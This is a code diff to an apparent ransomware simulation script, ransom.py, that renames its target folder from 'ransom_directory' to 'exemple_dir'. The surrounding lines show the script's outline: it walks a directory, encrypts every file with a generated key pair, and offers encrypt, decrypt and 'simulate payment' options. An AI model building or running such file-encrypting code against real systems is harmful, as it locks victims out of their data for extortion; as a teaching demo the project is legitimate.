@@ -113,7 +113,7 @@ def clear():
   
 def get_tree_file():
     files = []
-    for path, _, file_names in os.walk(f"ransom_directory"):
+    for path, _, file_names in os.walk(f"exemple_dir"):
         for file_name in file_names:
             file_path = os.path.join(path, file_name)
             files.append(file_path)
@@ -124,7 +124,7 @@ def get_tree_file():
 def encrypt_all():
     privkey, pubkey = gen_key() # generate key pair
     
-    for file in get_tree_file(): # encrypt all files in ransom_directory
+    for file in get_tree_file(): # encrypt all files in exemple_dir
         try:
             encrypt(file, pubkey)
         except Exception as e:
@@ -134,7 +134,7 @@ def encrypt_all():
 def decrypt_all():
     privkey, pubkey = gen_key() # generate key pair
     
-    for file in get_tree_file(): # decrypt all files in ransom_directory
+    for file in get_tree_file(): # decrypt all files in exemple_dir
         try:
             decrypt(file, privkey)
         except Exception as e:
@@ -150,8 +150,8 @@ def main():
     OPTIONS:
         -h      Show this help menu
         -a      All in one (encrypt + simulate payment + decrypt)
-        -en     Encrypt all files in ransom_directory
-        -de     Decrypt all files in ransom_directory
+        -en     Encrypt all files in exemple_dir
+        -de     Decrypt all files in exemple_dir
     EXAMPLES:
         python3 ransom.py -a"""
    
